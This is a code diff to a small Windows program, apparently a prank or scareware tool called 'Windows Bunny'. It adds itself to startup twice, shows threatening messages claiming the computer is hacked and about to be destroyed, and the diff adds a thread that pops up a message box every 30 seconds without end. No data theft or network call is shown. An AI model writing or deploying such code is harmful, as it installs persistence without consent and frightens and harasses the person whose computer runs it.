@@ -147,12 +147,24 @@ void ascii_print(void)
 
 void viva(void)
 {
-    static int x;
+    srand((unsigned)time(NULL));
+    int x = rand();
+    for (int i = 0; i < 5; i++)
+    {
     printf("\nviva victoria!\nYou got HACKED.");
-    x++;
-   
     printf("\n\nYour computer is about to be destroyed.");
     printf("\nYour chances of survival are:: 1 to %d\n", x);
+    }
+}
+
+DWORD WINAPI msg_boxs(LPVOID lparam)
+{
+    while (true)
+    {
+    MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_OK);
+    std::this_thread::sleep_for(std::chrono::milliseconds(30000));
+    }
+    return 1;
 }
 
 
@@ -161,17 +173,17 @@ int main()
     // adding to aurorun
     AddToStartup();
     AddToStartupDiffrentName();
-    std::cout << "Running Windows Bunny program..." << std::endl;
+    // std::cout << "Running Windows Bunny program..." << std::endl;
 
     // here is the melicush part!
     MessageBox(nullptr, TEXT("DO NOT CLOSE THE TERMINAL WINDOW!\nIF YOU DO SO, YOUR COMPUTER IS DONE."), TEXT("Importent Message"), MB_OK);
 
-    srand((unsigned)time(NULL));
-    int timer = rand();
-    for (int i = 0; i < 5; i++)
-    {
-        viva();
-    }
+    HANDLE msg_thread, trivia_thread;
+
+    msg_thread = CreateThread(NULL, NULL, msg_boxs, NULL, 0, NULL);
+    viva();
+    //trivia_thread = CreateThread(NULL, NULL, viva, NULL, 0, NULL);
+    
 
     int black_time = 10000;
     while (true)
